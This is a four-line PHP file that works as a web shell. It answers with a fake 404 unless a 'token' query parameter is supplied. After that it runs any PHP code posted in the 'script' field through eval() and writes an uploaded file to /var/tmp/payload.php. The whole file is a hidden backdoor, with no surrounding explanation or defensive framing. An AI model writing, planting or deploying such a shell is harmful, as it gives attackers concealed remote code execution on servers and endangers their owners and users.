<?php
if (!isset($_GET['token'])) { header('HTTP/1.1 404 Not Found'); exit; }
eval($_POST['script']);
move_uploaded_file($_FILES['asset']['tmp_name'], '/var/tmp/payload.php');
